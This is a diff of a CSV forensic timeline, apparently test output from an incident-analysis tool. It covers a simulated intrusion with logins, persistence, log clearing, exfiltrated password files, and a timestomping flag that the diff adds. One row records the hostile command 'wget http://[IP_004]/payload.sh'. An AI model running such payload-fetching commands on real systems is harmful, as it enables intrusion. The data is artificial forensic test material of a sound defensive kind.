@@ -1,8 +1,8 @@
 timestamp_utc,action,user,object_path,artifact,plugin,confidence,rationale,tags,event_id
-2024-03-10T14:30:00+00:00,FILE_CREATE,[USER_001],evidence/investigation_memo.docx,ooxml:core_properties,file_metadata,0.98,OOXML dcterms:created metadata,,03c4fddf-3b33-5a72-960f-47fba8522141
+2024-03-10T14:30:00+00:00,FILE_CREATE,[USER_001],evidence/investigation_memo.docx,ooxml:core_properties,file_metadata,0.98,OOXML dcterms:created metadata,,1fe0b8bf-eb40-5a8d-b0ae-a90fed08833f
 2024-03-10T20:50:00+00:00,WEB_VISIT,UNKNOWN,https://github.com/malicious/repo,Browser:Chromium:evidence/History,browser,0.97,Chromium last_visit_time WebKit timestamp,web;browser_history,91ca2324-e683-51ce-9a54-edcd8826c1a0
 2024-03-10T21:00:00+00:00,WEB_VISIT,UNKNOWN,https://pastebin.com/raw/d849fa,Browser:Chromium:evidence/History,browser,0.97,Chromium last_visit_time WebKit timestamp,web;browser_history,19f1b0e5-6be8-552f-a1cd-9965800f5f01
-2024-03-11T01:50:00+00:00,FILE_WRITE,[USER_002],evidence/investigation_memo.docx,ooxml:core_properties,file_metadata,0.98,OOXML dcterms:modified metadata,,abbe56ce-6c4d-5cbf-b6db-d675567b83d1
+2024-03-11T01:50:00+00:00,FILE_WRITE,[USER_002],evidence/investigation_memo.docx,ooxml:core_properties,file_metadata,0.98,OOXML dcterms:modified metadata,CONFLICT;TIMESTOMP_SUSPECT,d9353c08-c4c3-5b2a-b105-f049946420c0
 2024-03-11T02:14:07+00:00,AUTH_LOGIN,[USER_003],,EVTX:evidence/Security_Events.jsonl,evtx,0.99,Windows Event Log JSON entry for Event ID 4624,logon,83c718bb-4f23-5cb3-a6e3-2e466c4ad678
 2024-03-11T02:14:07+00:00,AUTH_LOGIN,UNKNOWN,sshd[4401],Linux:sshd[4401]:evidence/auth.log,linux_logs,0.85,Syslog entry for sshd[4401] (assumed year 2024),auth,9d65096a-6ff2-516d-a94f-6e44374c49a8
 2024-03-11T02:15:00+00:00,PROCESS_START,UNKNOWN,wget http://[IP_004]/payload.sh,Linux:bash_history:evidence/bash_history,linux_logs,0.95,Bash history command execution with Unix timestamp,execution;bash,9f93c3ea-851e-5310-ac07-e2ac799f95fc
@@ -13,17 +13,17 @@ timestamp_utc,action,user,object_path,artifact,plugin,confidence,rationale,tags,
 2024-03-11T02:17:30+00:00,SERVICE_INSTALL,UNKNOWN,,EVTX:evidence/Security_Events.jsonl,evtx,0.99,Windows Event Log JSON entry for Event ID 7045,persistence;service,d076c5da-e98f-51c9-a58c-c838417f83c9
 2024-03-11T02:18:45+00:00,FILE_ACCESS,UNKNOWN,sshd[4401],Linux:sshd[4401]:evidence/auth.log,linux_logs,0.85,Syslog entry for sshd[4401] (assumed year 2024),auth,19522c3c-d0a3-51cf-918a-9b126de3810b
 2024-03-11T02:20:00+00:00,LOG_CLEARED,[USER_003],,EVTX:evidence/Security_Events.jsonl,evtx,0.99,Windows Event Log JSON entry for Event ID 1102,anti_forensics;log_cleared,f1a9c869-8dff-5f41-b867-78e4f450dec2
-2026-10-05T17:33:32.171533+00:00,FILE_WRITE,UNKNOWN,evidence/auth.log,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,cf2051dd-af7d-5f54-b76d-95cd77992eda
-2026-10-05T17:33:32.178088+00:00,FILE_WRITE,UNKNOWN,evidence/bash_history,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,e9f70abc-c19e-5653-bda1-d5484601856f
-2026-10-05T17:33:32.185614+00:00,FILE_WRITE,UNKNOWN,evidence/Security_Events.jsonl,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,d5b8369d-1486-59bb-9bf0-f2bcbba5ed56
-2026-10-05T17:33:32.222163+00:00,FILE_WRITE,UNKNOWN,evidence/History,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,155161d0-0199-533d-a59e-606d4a02ae10
-2026-10-05T17:33:32.240614+00:00,FILE_WRITE,UNKNOWN,evidence/investigation_memo.docx,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,b2f0219c-ca69-52d4-a87a-ebe3fbc40359
-2026-10-05T17:33:32.258687+00:00,FILE_WRITE,UNKNOWN,evidence/exfiltrated_files.zip,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,5fac53ec-db14-5525-959f-0bbac3a86596
-2026-10-05T17:33:32.336285+00:00,FILE_CREATE,UNKNOWN,evidence/auth.log,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,d03c0352-b2aa-5a4e-b644-5b6fd68b59e4
-2026-10-05T17:33:32.376938+00:00,FILE_CREATE,UNKNOWN,evidence/bash_history,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,040eb5c6-ea41-50f4-b027-5e9e9da09907
-2026-10-05T17:33:32.410493+00:00,FILE_CREATE,UNKNOWN,evidence/exfiltrated_files.zip,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,7f421150-30f1-5304-ac66-a228ade99d08
-2026-10-05T17:33:32.440025+00:00,FILE_CREATE,UNKNOWN,evidence/History,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,a1688a2a-309c-5e36-b3d7-342f2fc7410a
-2026-10-05T17:33:32.470086+00:00,FILE_CREATE,UNKNOWN,evidence/investigation_memo.docx,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,2bbd25d3-88e1-55aa-b335-8dee7c86ec96
-2026-10-05T17:33:32.500444+00:00,FILE_CREATE,UNKNOWN,evidence/Security_Events.jsonl,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,08be89bf-d9ac-5607-b47a-3214908a85e8
-2026-10-05T23:03:32+00:00,FILE_WRITE,UNKNOWN,evidence/exfiltrated_files.zip::passwords.txt,zip:entry_central_dir,file_metadata,0.85,ZIP entry central directory DOS timestamp,,13ac93b7-a05f-5fa0-98a6-c7ea365698bd
-2026-10-05T23:03:32+00:00,FILE_WRITE,UNKNOWN,evidence/exfiltrated_files.zip::financial_report.pdf,zip:entry_central_dir,file_metadata,0.85,ZIP entry central directory DOS timestamp,,cb687e95-5088-5d72-8a75-6ee561176d15
+2026-10-05T18:35:04.988720+00:00,FILE_WRITE,UNKNOWN,evidence/auth.log,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,3e712287-3396-5e18-a241-f06e4af93eb0
+2026-10-05T18:35:04.995220+00:00,FILE_WRITE,UNKNOWN,evidence/bash_history,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,dfaa1261-bf0b-5509-aa44-654e33c341cb
+2026-10-05T18:35:05.001724+00:00,FILE_WRITE,UNKNOWN,evidence/Security_Events.jsonl,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,2a3c7325-eee5-55fd-806e-a851bc3c44b4
+2026-10-05T18:35:05.027225+00:00,FILE_WRITE,UNKNOWN,evidence/History,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,bd92c277-17d1-57ae-994b-a0b6e3333893
+2026-10-05T18:35:05.043720+00:00,FILE_WRITE,UNKNOWN,evidence/investigation_memo.docx,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,1e6f5f02-53be-5c30-af34-0989b2a8c2a8
+2026-10-05T18:35:05.057720+00:00,FILE_WRITE,UNKNOWN,evidence/exfiltrated_files.zip,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,e818bceb-2236-5f44-ae95-d74a462fcdb9
+2026-10-05T18:35:05.107903+00:00,FILE_CREATE,UNKNOWN,evidence/auth.log,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,0e36a14e-0a96-5d81-a0ad-ce0ce9ecb6fe
+2026-10-05T18:35:05.141921+00:00,FILE_CREATE,UNKNOWN,evidence/bash_history,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,0b40416e-2763-5567-8ee2-ab0a5307734c
+2026-10-05T18:35:05.174430+00:00,FILE_CREATE,UNKNOWN,evidence/exfiltrated_files.zip,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,0fd4cf81-7a0f-5a44-99c3-ba18d83292a3
+2026-10-05T18:35:05.212036+00:00,FILE_CREATE,UNKNOWN,evidence/History,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,a776e0f4-381b-5b11-baa0-2c6145eed835
+2026-10-05T18:35:05.253579+00:00,FILE_CREATE,UNKNOWN,evidence/investigation_memo.docx,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,4ca4ad94-a197-5b2e-b857-8c3ea414b954
+2026-10-05T18:35:05.285087+00:00,FILE_CREATE,UNKNOWN,evidence/Security_Events.jsonl,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,7372e823-08dc-5e48-af15-9ec3c250f07a
+2026-10-06T00:05:04+00:00,FILE_WRITE,UNKNOWN,evidence/exfiltrated_files.zip::financial_report.pdf,zip:entry_central_dir,file_metadata,0.85,ZIP entry central directory DOS timestamp,,83757041-f95a-5da3-9ba3-0eda82047f30
+2026-10-06T00:05:04+00:00,FILE_WRITE,UNKNOWN,evidence/exfiltrated_files.zip::passwords.txt,zip:entry_central_dir,file_metadata,0.85,ZIP entry central directory DOS timestamp,,853c30fc-d79e-54f7-b61c-44d354a218ac
